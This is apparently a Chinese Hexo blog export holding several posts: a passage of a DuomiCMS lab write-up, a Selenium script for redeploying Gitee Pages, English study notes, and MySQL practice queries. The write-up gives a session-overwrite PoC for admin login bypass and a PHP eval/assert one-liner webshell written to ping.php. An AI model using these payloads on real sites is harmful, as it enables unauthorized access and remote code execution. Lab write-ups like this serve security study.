<p><img src="https://bbs.zkaq.cn/upload/md/dc40ab11c8a89221340c29446b9fce97_88479.png" alt="img"></p>
<p><strong>但是最后要记得改回去，否则对于我们后面的测试会有碍。</strong><br><strong>然后进入check.admin.php页面找到SESSION的变量赋值规则：</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/7f1b2097f379b6c87dd487e4868460a7_41037.png" alt="img"></p>
<p><strong>主要找到保存回话的函数，这样我们给cookie赋值SESSION的话去别的页面还会带着这个管理员权限的session。</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/0cc795917c522838c5090bc83503cd87_52113.png" alt="img"></p>
<p>通过这里可以设置session值进行赋值来获得权限，groupid是权限的意思，我们全文一搜索，轻松的发现</p>
<p><img src="https://img2020.cnblogs.com/blog/2354201/202104/2354201-20210411200437677-1987847776.png" alt=""></p>
<p><strong>对比找到SESSION不同的地方，就是管理员的值：<br>不同的键值：_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin<br>构建POC：interface/comment.php?_SESSION[duomi_group_id]=1&amp;_SESSION[duomi_admin_id]=1&amp;_SESSION[duomi_admin_name]=admin<br>放入接受SESSION传参且存在变量覆盖漏洞的地方，给我们的cookie绑定上管理员SESSION值，然后访问管理员后台，自动登录：</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/30619e52fb63bad3c319e348ac582294_93535.png" alt="img"></p>
<p><img src="https://bbs.zkaq.cn/upload/md/98eda8f521184091ca070f36f1f52700_61062.png" alt="img"></p>
<p>本地环境测试下面靶场：</p>
<p>测试靶场：<a href="http://59.63.200.79:8010/abc/upload/" target="_blank" rel="noopener">http://59.63.200.79:8010/abc/upload/</a></p>
<p><img src="https://bbs.zkaq.cn/upload/md/1c03eeec760e2410a477447850053bcb_14804.png" alt="img"></p>
<p><img src="https://bbs.zkaq.cn/upload/md/642c8244ffbd0e1e459949eb7c8509dc_18045.png" alt="img"></p>
<p>获得flag.</p>
<p><strong>最后在后台的全局中的百度推送，可以通过插版权的方法拿到一个webshell：</strong><br><strong>插入一句话木马：123456789”;eval($_POST[‘z’]);//</strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/8daa472f7b87472fd9a1e6f769de9c73_60276.png" alt="img"></p>
<p><strong>会写入到 /duomicms/data/admin/ping.php 文件中，这也是我们审计中可以发现的，如果是黑盒的话，就无从下手了。</strong><br><strong>后来发现这个CMS禁用了eval()函数，使用assert()函数替代了eval()函数最后成功写入一句话木马。</strong><br><strong><a href="http://127.0.0.1/upload/data/admin/ping.php?z=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/upload/data/admin/ping.php?z=phpinfo()</a></strong></p>
<p><img src="https://bbs.zkaq.cn/upload/md/56d2e7553d33fbf782b6f1f9917b4f88_48857.png" alt="img"></p>
<p><img src="https://bbs.zkaq.cn/upload/md/4b0372d5997554ecd9bab5e3f66fe864_25735.png" alt="img"></p>
<p><strong>eval($_REQUEST[‘z’])<br>assert($_REQUEST[‘z’])</strong></p>
<p><strong>不过有一个问题，eval传入一句话木马，系统本身禁用了eval()这个函数，我们访问写入木马的页面访问不到，但是菜刀可以连接上。改为assert（）方式传入，可以检测到写入木马的页面 但是无法菜刀连接。我很费解！</strong></p>
<p>漏洞分析：<a href="https://www.freebuf.com/column/188018.html" target="_blank" rel="noopener">https://www.freebuf.com/column/188018.html</a></p>
]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitee pages自动部署</title>
    <url>/posts/106.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h1><h2 id="1-1-安装环境"><a href="#1-1-安装环境" class="headerlink" title="1.1 安装环境"></a>1.1 安装环境</h2><blockquote>
<p>1、安装python3 2、打开命令行安装selenium</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure></div>

<h1 id="二、python代码"><a href="#二、python代码" class="headerlink" title="二、python代码"></a>二、python代码</h1><h2 id="2-1-源码"><a href="#2-1-源码" class="headerlink" title="2.1 源码"></a>2.1 源码</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import time</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.alert import Alert</span><br><span class="line"></span><br><span class="line"># 模拟浏览器打开到gitee登录界面</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&#39;https:&#x2F;&#x2F;gitee.com&#x2F;login&#39;)</span><br><span class="line"># 将窗口最大化</span><br><span class="line">driver.maximize_window()</span><br><span class="line">time.sleep(2)</span><br><span class="line"></span><br><span class="line"># 输入账号--通过html的id属性定位输入位置--改为你的账号</span><br><span class="line">user_login &#x3D; driver.find_element_by_id(&#39;user_login&#39;)</span><br><span class="line">user_login.send_keys(&quot;此处改为你的账号&quot;)</span><br><span class="line"># 输入密码--通过html的id属性定位输入位置--改为你的密码</span><br><span class="line">driver.find_element_by_id(&#39;user_password&#39;).send_keys(&quot;此处改为你的密码&quot;)</span><br><span class="line"># 点击登录按钮--通过xpath确定点击位置</span><br><span class="line">driver.find_element_by_xpath(</span><br><span class="line">    &#39;&#x2F;html&#x2F;body&#x2F;div[2]&#x2F;div[2]&#x2F;div[1]&#x2F;div&#x2F;div[2]&#x2F;div&#x2F;form[1]&#x2F;div[2]&#x2F;div&#x2F;div&#x2F;div[4]&#x2F;input&#39;).click()</span><br><span class="line"></span><br><span class="line">time.sleep(2)</span><br><span class="line"></span><br><span class="line"># 切换到gitee pages界面--改为you_gitee_id</span><br><span class="line">driver.get(&#39;https:&#x2F;&#x2F;gitee.com&#x2F;此处改为you_gitee_id&#x2F;此处改为you_gitee_id&#x2F;pages&#39;)</span><br><span class="line"># 点击更新按钮--通过xpath确定点击位置</span><br><span class="line">driver.find_element_by_xpath(&#39;&#x2F;html&#x2F;body&#x2F;div[3]&#x2F;div[2]&#x2F;div&#x2F;div[2]&#x2F;div[1]&#x2F;form&#x2F;div[7]&#39;).click()</span><br><span class="line"># 确认更新提示框--这个函数的作用是确认提示框</span><br><span class="line">Alert(driver).accept()</span><br><span class="line"></span><br><span class="line"># 等待5秒更新</span><br><span class="line">time.sleep(5)</span><br><span class="line"></span><br><span class="line"># 这个print其实没事什么用,如果真的要测试脚本是否运行成功，可以用try来抛出异常</span><br><span class="line">print(&quot;成功&quot;)</span><br><span class="line"></span><br><span class="line"># 脚本运行成功,退出浏览器</span><br><span class="line">driver.quit()</span><br><span class="line"></span><br><span class="line"># 写上更新日志</span><br><span class="line"># 我这里是写在D盘，可以改为自己喜欢的目录</span><br><span class="line">fp &#x3D; open(&quot;D:\log.txt&quot;, &quot;a+&quot;)</span><br><span class="line">now_time &#x3D; time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())</span><br><span class="line">fp.write(&quot;auto update time:&#123;0&#125;\n&quot;.format(now_time))</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure></div>

<h2 id="2-2-注意事项"><a href="#2-2-注意事项" class="headerlink" title="2.2 注意事项"></a>2.2 注意事项</h2><ul>
<li><blockquote>
<p>xpath可以通过在chrom的网页里面按F12来查看</p>
</blockquote>
</li>
<li><p>演示过程</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210820211851297.png" alt="">)<img src="https://gylq.gitee.io/cloudimages/img/image-20210820212050702.png" alt="image-20210820212050702"></p>
</li>
<li><blockquote>
<p>需要将chromeDrive可执行驱动丢到你python根目录（跟python.exe放在一起）</p>
</blockquote>
</li>
</ul>
<p><strong>下载地址</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;chromedriver.storage.googleapis.com&#x2F;index.html</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>Gitee自动部署</tag>
        <tag>python脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>Monster第一天</title>
    <url>/posts/14.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>详细阅读之策略</title>
    <url>/posts/17.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="区域解题内涵"><a href="#区域解题内涵" class="headerlink" title="区域解题内涵"></a>区域解题内涵</h1><pre><code>|- 跳读文章找区域
|- 依次而下是原则（主旨为独立题型）
|- 区域之间无交集
|- 前本后句是核心</code></pre>]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>Monster的口语方法</title>
    <url>/posts/15.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、主题式句子积累"><a href="#一、主题式句子积累" class="headerlink" title="一、主题式句子积累"></a>一、主题式句子积累</h1><blockquote>
<p><strong>去洗手间</strong></p>
<p>Excuse me, I need to go to the restroom\bathroom.</p>
<p>I wonder if I can go somewhere?</p>
<p>Can you tell me where the powder room is?<br>Powder room 补粉的房间</p>
<p>Excuse me, where can I wash my hands?</p>
<p>where’s john?</p>
<p>Nature calls me.天性在召唤我</p>
</blockquote>
<blockquote>
<p>I will always remember you. 我会永远记住你<br>I run into some problems. 我遇到一些问题<br>gorgeous\good-looking 他很帅<br>tasty 菜很好吃<br>not bad 一般般<br>after you \ go ahead 你先走<br>How are you doing? 你吃了没有<br>I’ve eaten 我吃过了<br>eat soup 喝汤<br>take medicine 吃药</p>
</blockquote>
<blockquote>
<p>想要干什么：Would you like to<br>唱歌：go singing\go to karaoke<br>I’d love to, but I’m not good at singing. = I’m not a good singer.<br>五音不全：I’m tone-deaf.<br>我唱歌老跑调：I can never sing in tune.\ I sing out of tune.</p>
<p>我没勇气在别人面前唱歌<br>I don’t have the nerve to sing in front of people</p>
<p>How about a drink?</p>
<p>Would you like to have a drink.</p>
<p>I get drunk easily.<br>I’m a light drinker.<br>I’m heavy drinker.<br>I can drink like a fish</p>
</blockquote>
<blockquote>
<p>see a doctor 看医生<br>what’s the matter. 你怎么了<br>what’s wrong with you?<br>what are you symptoms? 症状</p>
<p>I feel sluggish./ I feel tired. 浑身没劲<br>I feel dizzy. 我头晕目眩<br>I have a runny nose.流鼻涕<br>I feel like throwing up. 我想吐<br>I have a headache. 我头痛<br>My head is pounding.头痛<br>I have a splitting headache.我的头要裂了</p>
</blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL——27道练习题</title>
    <url>/posts/13.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1、取得每个部门最高薪水的人员名称"><a href="#1、取得每个部门最高薪水的人员名称" class="headerlink" title="1、取得每个部门最高薪水的人员名称"></a>1、取得每个部门最高薪水的人员名称</h1><p><em>第一步：取得每个部门最高薪水</em>(按照部门编号分组找出每一个部门最大值)</p>
<pre><code>select 
    deptno,max(sal) maxsal 
from 
    emp 
group by 
    deptno;</code></pre><p>+——–+———-+<br>| deptno | maxsal   |<br>+——–+———-+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |<br>+——–+———-+<br>第二步：自连接（将以上的查询结果当做一张临时表t，t和emp表连接，条件:t.deptno=e.deptno and t.maxsal = e.sal)</p>
<pre><code>select 
    e.ename,t.* 
from 
    emp e 
join 
    (select deptno,max(sal) maxsal from emp group by deptno) t 
on 
    t.maxsal=e.sal and t.deptno=e.deptno;</code></pre><p>+——-+——–+———+<br>| ename | deptno | maxsal  |<br>+——-+——–+———+<br>| BLAKE |     30 | 2850.00 |<br>| SCOTT |     20 | 3000.00 |<br>| KING  |     10 | 5000.00 |<br>| FORD  |     20 | 3000.00 |<br>+——-+——–+———+</p>
<h1 id="2、哪些人的薪水在部门的平均薪资之上"><a href="#2、哪些人的薪水在部门的平均薪资之上" class="headerlink" title="2、哪些人的薪水在部门的平均薪资之上"></a>2、哪些人的薪水在部门的平均薪资之上</h1><p><em>第一步:找出每个部门的平均薪资</em></p>
<pre><code>select 
    deptno,avg(sal) avgsal
from 
    emp
group by
    deptno;</code></pre><p>+——–+————-+<br>| deptno | avgsal      |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>|     20 | 2175.000000 |<br>|     30 | 1566.666667 |<br>+——–+————-+</p>
<p><em>第二步：将以上查询结果当做t表，t和emp表连接</em><br><strong>条件：部门编号相同，并且emp的sal大于t表的avgsal</strong></p>
<pre><code>select 
    e.ename,t.deptno,e.sal
from 
    emp e 
join
    (select deptno,avg(sal) avgsal from emp group by deptno) t
on
    e.sal&gt;t.avgsal and e.deptno=t.deptno;</code></pre><p>+——-+——–+———+<br>| ename | deptno | sal     |<br>+——-+——–+———+<br>| ALLEN |     30 | 1600.00 |<br>| JONES |     20 | 2975.00 |<br>| BLAKE |     30 | 2850.00 |<br>| SCOTT |     20 | 3000.00 |<br>| KING  |     10 | 5000.00 |<br>| FORD  |     20 | 3000.00 |<br>+——-+——–+———+</p>
<h1 id="3、取得部门中（所有人的）平均的薪资等级"><a href="#3、取得部门中（所有人的）平均的薪资等级" class="headerlink" title="3、取得部门中（所有人的）平均的薪资等级"></a>3、取得部门中（所有人的）平均的薪资等级</h1><blockquote>
<p>平均的薪水等级：先计算每一个薪水的等级，然后找出薪水等级的平均值。<br>平均薪水的等级：先计算平均薪水，然后找出每个平均薪水的等级值。</p>
</blockquote>
<p><em>第一步：找出每个人的薪水等级</em></p>
<pre><code>select
    e.ename,e.sal,e.deptno,s.grade
from
    emp e
join
    salgrade s
on
    e.sal between s.losal and s.hisal
order by
    deptno;</code></pre><p>+——–+———+——–+——-+<br>| ename  | sal     | deptno | grade |<br>+——–+———+——–+——-+<br>| CLARK  | 2450.00 |     10 |     4 |<br>| KING   | 5000.00 |     10 |     5 |<br>| MILLER | 1300.00 |     10 |     2 |<br>| ADAMS  | 1100.00 |     20 |     1 |<br>| SCOTT  | 3000.00 |     20 |     4 |<br>| FORD   | 3000.00 |     20 |     4 |<br>| JONES  | 2975.00 |     20 |     4 |<br>| SMITH  |  800.00 |     20 |     1 |<br>| ALLEN  | 1600.00 |     30 |     3 |<br>| JAMES  |  950.00 |     30 |     1 |<br>| WARD   | 1250.00 |     30 |     2 |<br>| MARTIN | 1250.00 |     30 |     2 |<br>| TURNER | 1500.00 |     30 |     3 |<br>| BLAKE  | 2850.00 |     30 |     4 |<br>+——–+———+——–+——-+</p>
<p><em>基于以上的结果继续按照deptno分组，求grade的平均值</em></p>
<pre><code>select
    e.deptno,avg(s.grade) avggrade
from
    emp e
join
    salgrade s
on
    e.sal between s.losal and s.hisal
group by
    e.deptno;</code></pre><p>+——–+———-+<br>| deptno | avggrade |<br>+——–+———-+<br>|     10 |   3.6667 |<br>|     20 |   2.8000 |<br>|     30 |   2.5000 |<br>+——–+———-+</p>
<h1 id="4、不准用组函数（MAX），取得最高薪水"><a href="#4、不准用组函数（MAX），取得最高薪水" class="headerlink" title="4、不准用组函数（MAX），取得最高薪水"></a>4、不准用组函数（MAX），取得最高薪水</h1><p><em>第一种，降序，limit 1</em></p>
<pre><code>select ename,sal from emp order by sal desc limit 1;</code></pre><p>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| KING  | 5000.00 |<br>+——-+———+</p>
<p><em>第二种，表的自连接</em></p>
<blockquote>
<p>select sal from emp where sal not in(select distinct a.sal from (select sal from emp) a join (select sal from emp) b on a.sal&lt;b.sal);<br>+———+<br>| sal     |<br>+———+<br>| 5000.00 |<br>+———+<br>select distinct a.sal from (select sal from emp) a join (select sal from emp) b on a.sal&lt;b.sal;<br>a表<br>+———+<br>|  800.00 |<br>| 1600.00 |<br>| 1250.00 |<br>| 2975.00 |<br>| 1250.00 |<br>| 2850.00 |<br>| 2450.00 |<br>| 3000.00 |<br>| 5000.00 |<br>| 1500.00 |<br>| 1100.00 |<br>|  950.00 |<br>| 3000.00 |<br>| 1300.00 |<br>+———+<br>b表<br>+———+<br>|  800.00 |<br>| 1600.00 |<br>| 1250.00 |<br>| 2975.00 |<br>| 1250.00 |<br>| 2850.00 |<br>| 2450.00 |<br>| 3000.00 |<br>| 5000.00 |<br>| 1500.00 |<br>| 1100.00 |<br>|  950.00 |<br>| 3000.00 |<br>| 1300.00 |<br>+———+</p>
</blockquote>
<h1 id="5、取得平均薪水最高的部门的部门编号"><a href="#5、取得平均薪水最高的部门的部门编号" class="headerlink" title="5、取得平均薪水最高的部门的部门编号"></a>5、取得平均薪水最高的部门的部门编号</h1><p><em>第一种方案 //max</em><br><strong>第一步：取得每个部门的平均薪水</strong></p>
<pre><code>select deptno,avg(sal) avgsal from emp group by deptno;</code></pre><p>+——–+————-+<br>| deptno | avgsal      |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>|     20 | 2175.000000 |<br>|     30 | 1566.666667 |<br>+——–+————-+<br><strong>第二步把上表当做临时表，然后用max进行求最大值的部门编号</strong><br>        select t.deptno,max(t.avgsal) maxavgsal from (select deptno,avg(sal) avgsal from emp group by deptno) t;<br>+——–+————-+<br>| deptno | maxavgsal   |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>+——–+————-+</p>
<p><em>第二个方案 //降序取第一个</em><br><strong>第一步：取得每个部门的平均薪水</strong><br><strong>第二步：将上表当做临时表，通过avgsal进行降序排序，然后limit 1取第一行</strong></p>
<pre><code>select deptno,avg(sal) avgsal from emp group by deptno order by avgsal desc limit 1;</code></pre><p>+——–+————-+<br>| deptno | avgsal      |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>+——–+————-+</p>
<h1 id="6、取得平均薪水最高的部门的部门名称"><a href="#6、取得平均薪水最高的部门的部门名称" class="headerlink" title="6、取得平均薪水最高的部门的部门名称"></a>6、取得平均薪水最高的部门的部门名称</h1><p><em>第一步，取得平均薪水最高的部门</em></p>
<pre><code>select avg(sal) 平均薪水, deptno from emp group by deptno order by 平均薪水 desc limit 1;</code></pre><p>+————-+——–+<br>| 平均薪水    | deptno |<br>+————-+——–+<br>| 2916.666667 |     10 |<br>+————-+——–+</p>
<p><em>第二步，取得最高的部门名称</em></p>
<pre><code>select d.dname,t.平均薪水 from dept d join (select avg(sal) 平均薪水, deptno from emp group by deptno order by 平均薪水 desc limit 1) t on d.deptno=t.deptno;</code></pre><p>+————+————-+<br>| dname      | 平均薪水    |<br>+————+————-+<br>| ACCOUNTING | 2916.666667 |<br>+————+————-+</p>
<h1 id="7、求平均薪水的等级最低的部门的部门名称"><a href="#7、求平均薪水的等级最低的部门的部门名称" class="headerlink" title="7、求平均薪水的等级最低的部门的部门名称"></a>7、求平均薪水的等级最低的部门的部门名称</h1><p><em>第一步，求平均薪水的等级最低的部门</em></p>
<pre><code>select t.*,s.grade from salgrade s join (select avg(sal) avgsal, deptno from emp group by deptno) t on t.avgsal between losal and hisal order by grade asc limit 1;</code></pre><p>+————-+——–+——-+<br>| avgsal      | deptno | grade |<br>+————-+——–+——-+<br>| 1566.666667 |     30 |     3 |<br>+————-+——–+——-+</p>
<p><em>第二步，找出部门名称</em><br>        select d.dname, p.grade from dept d join(select t.*,s.grade from salgrade s join (select avg(sal) avgsal, deptno from emp group by deptno) t on t.avgsal between losal and hisal order by grade asc limit 1) p on d.deptno = p.deptno;<br>+——-+——-+<br>| dname | grade |<br>+——-+——-+<br>| SALES |     3 |<br>+——-+——-+</p>
<h1 id="8、取得比普通员工（员工代码没有在mgr字段上出现的）的最高薪水还要高的领导人姓名"><a href="#8、取得比普通员工（员工代码没有在mgr字段上出现的）的最高薪水还要高的领导人姓名" class="headerlink" title="8、取得比普通员工（员工代码没有在mgr字段上出现的）的最高薪水还要高的领导人姓名"></a>8、取得比普通员工（员工代码没有在mgr字段上出现的）的最高薪水还要高的领导人姓名</h1><p><strong>领导</strong><br>        mysql&gt; select distinct mgr from emp;<br>        +——+<br>        | mgr  |<br>        +——+<br>        | 7902 |<br>        | 7698 |<br>        | 7839 |<br>        | 7566 |<br>        | NULL |<br>        | 7788 |<br>        | 7782 |<br>        +——+</p>
<p><em>第一步，求出普通员工的最高薪水</em></p>
<pre><code>select max(sal) from emp where empno not in(select distinct mgr from emp where mgr is not NULL);</code></pre><p>+———-+<br>| max(sal) |<br>+———-+<br>|  1600.00 |<br>+———-+</p>
<p><em>第二步，求出比普通员工最高薪水还高的领导</em><br><strong>比普通员工薪水最高薪水还高的就是领导</strong><br>         select ename,sal from emp where sal&gt;(select max(sal) from emp where empno not in(select distinct mgr from emp where mgr is not NULL));<br>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| JONES | 2975.00 |<br>| BLAKE | 2850.00 |<br>| CLARK | 2450.00 |<br>| SCOTT | 3000.00 |<br>| KING  | 5000.00 |<br>| FORD  | 3000.00 |<br>+——-+———+</p>
<h1 id="9、取得薪水最高的前五名员工"><a href="#9、取得薪水最高的前五名员工" class="headerlink" title="9、取得薪水最高的前五名员工"></a>9、取得薪水最高的前五名员工</h1><pre><code>select ename,sal from emp order by sal desc limit 0,5;</code></pre><p>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| KING  | 5000.00 |<br>| FORD  | 3000.00 |<br>| SCOTT | 3000.00 |<br>| JONES | 2975.00 |<br>| BLAKE | 2850.00 |<br>+——-+———+</p>
<h1 id="10、取得薪水最高的第六到第十名员工"><a href="#10、取得薪水最高的第六到第十名员工" class="headerlink" title="10、取得薪水最高的第六到第十名员工"></a>10、取得薪水最高的第六到第十名员工</h1><pre><code>select ename,sal from emp order by sal desc limit 5,5;</code></pre><p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| CLARK  | 2450.00 |<br>| ALLEN  | 1600.00 |<br>| TURNER | 1500.00 |<br>| MILLER | 1300.00 |<br>| WARD   | 1250.00 |<br>+——–+———+</p>
<h1 id="11、取得最后入职的5名员工"><a href="#11、取得最后入职的5名员工" class="headerlink" title="11、取得最后入职的5名员工"></a>11、取得最后入职的5名员工</h1><pre><code>select ename,hiredate from emp order by hiredate desc limit 5;</code></pre><p>+——–+————+<br>| ename  | hiredate   |<br>+——–+————+<br>| ADAMS  | 1987-05-23 |<br>| SCOTT  | 1987-04-19 |<br>| MILLER | 1982-01-23 |<br>| JAMES  | 1981-12-03 |<br>| FORD   | 1981-12-03 |<br>+——–+————+</p>
<h1 id="12、取得每个薪水等级有多少员工"><a href="#12、取得每个薪水等级有多少员工" class="headerlink" title="12、取得每个薪水等级有多少员工"></a>12、取得每个薪水等级有多少员工</h1><p><em>第一步，找出每个员工的薪水等级</em></p>
<pre><code>select e.ename, s.grade from emp e join salgrade s on e.sal between losal and hisal;</code></pre><p>+——–+——-+<br>| ename  | grade |<br>+——–+——-+<br>| SMITH  |     1 |<br>| ALLEN  |     3 |<br>| WARD   |     2 |<br>| JONES  |     4 |<br>| MARTIN |     2 |<br>| BLAKE  |     4 |<br>| CLARK  |     4 |<br>| SCOTT  |     4 |<br>| KING   |     5 |<br>| TURNER |     3 |<br>| ADAMS  |     1 |<br>| JAMES  |     1 |<br>| FORD   |     4 |<br>| MILLER |     2 |<br>+——–+——-+</p>
<p><em>第二步：继续按照grade分组统计数量</em></p>
<pre><code>select count(*), s.grade from emp e join salgrade s on e.sal between losal and hisal group by s.grade;</code></pre><p>+———-+——-+<br>| count(*) | grade |<br>+———-+——-+<br>|        3 |     1 |<br>|        3 |     2 |<br>|        2 |     3 |<br>|        5 |     4 |<br>|        1 |     5 |<br>+———-+——-+</p>
<h1 id="13、面试题"><a href="#13、面试题" class="headerlink" title="13、面试题"></a>13、面试题</h1><blockquote>
<p><strong>有3给表 S（学生表）,C（课程表），SC（学生选课表）S（SNO，SNAME）代号（学号，姓名）</strong><br><strong>C（CNO，CNAME，CTEACHER）代表（课号，课名，教师）</strong><br><strong>SC（SNO，CNO，SCGRADE）代表（学号，课号，成绩）</strong><br><strong>问题：</strong><br><em>1、找出没选过“黎明”老师的所有学生姓名。</em><br><em>2、列出2门以上（含两门）不及格学生姓名及平均成绩。</em><br><em>3、即学过1号课程又学过2号课所有学生的姓名。</em><br><strong>请用标准SQL语言写出答案，方言也行（请说明是使用说明方言）。</strong></p>
</blockquote>
<h1 id="14、列出所有员工及领导的姓名"><a href="#14、列出所有员工及领导的姓名" class="headerlink" title="14、列出所有员工及领导的姓名"></a>14、列出所有员工及领导的姓名</h1><pre><code>select a.ename 员工, b.ename 领导 from emp a left join emp b on a.mgr = b.empno;</code></pre><p>+——–+——-+<br>| 员工   | 领导  |<br>+——–+——-+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| KING   | NULL  |<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+——–+——-+</p>
<h1 id="15、列出受雇日期早于其直接上级的所有员工的编号，姓名，部门名称"><a href="#15、列出受雇日期早于其直接上级的所有员工的编号，姓名，部门名称" class="headerlink" title="15、列出受雇日期早于其直接上级的所有员工的编号，姓名，部门名称"></a>15、列出受雇日期早于其直接上级的所有员工的编号，姓名，部门名称</h1><p><em>第一步，求出员工与其上级员工</em></p>
<pre><code>select a.ename,b.ename from emp a join emp b on a.mgr = b.empno;</code></pre><p>+——–+——-+<br>| ename  | ename |<br>+——–+——-+<br>| SMITH  | FORD  |<br>| ALLEN  | BLAKE |<br>| WARD   | BLAKE |<br>| JONES  | KING  |<br>| MARTIN | BLAKE |<br>| BLAKE  | KING  |<br>| CLARK  | KING  |<br>| SCOTT  | JONES |<br>| TURNER | BLAKE |<br>| ADAMS  | SCOTT |<br>| JAMES  | BLAKE |<br>| FORD   | JONES |<br>| MILLER | CLARK |<br>+——–+——-+</p>
<p><em>第二步，对比a,b两个表hiredate的大小，找出受雇日期早于其领导的人员</em></p>
<pre><code>select a.ename from emp a join emp b on a.mgr = b.empno where a.hiredate&lt;b.hiredate;</code></pre><p>+——-+<br>| ename |<br>+——-+<br>| SMITH |<br>| ALLEN |<br>| WARD  |<br>| JONES |<br>| BLAKE |<br>| CLARK |<br>+——-+</p>
<p><em>第三步，利用自连接dept进行输出dname</em></p>
<pre><code>select a.ename,a.empno,d.dname from emp a join emp b on a.mgr = b.empno join dept d on a.deptno = d.deptno where a.hiredate&lt;b.hiredate;</code></pre><p>+——-+——-+————+<br>| ename | empno | dname      |<br>+——-+——-+————+<br>| SMITH |  7369 | RESEARCH   |<br>| ALLEN |  7499 | SALES      |<br>| WARD  |  7521 | SALES      |<br>| JONES |  7566 | RESEARCH   |<br>| BLAKE |  7698 | SALES      |<br>| CLARK |  7782 | ACCOUNTING |<br>+——-+——-+————+</p>
<h1 id="16、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门"><a href="#16、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门" class="headerlink" title="16、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门"></a>16、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门</h1><pre><code>select d.dname, e.* from emp e right join dept d on e.deptno = d.deptno;</code></pre><p>+————+——-+——–+———–+——+————+———+———+——–+<br>| dname      | EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+————+——-+——–+———–+——+————+———+———+——–+<br>| RESEARCH   |  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>| SALES      |  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>| SALES      |  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>| RESEARCH   |  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>| SALES      |  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>| SALES      |  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>| ACCOUNTING |  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>| RESEARCH   |  7788 | SCOTT  | ANALYST   | 7566 | 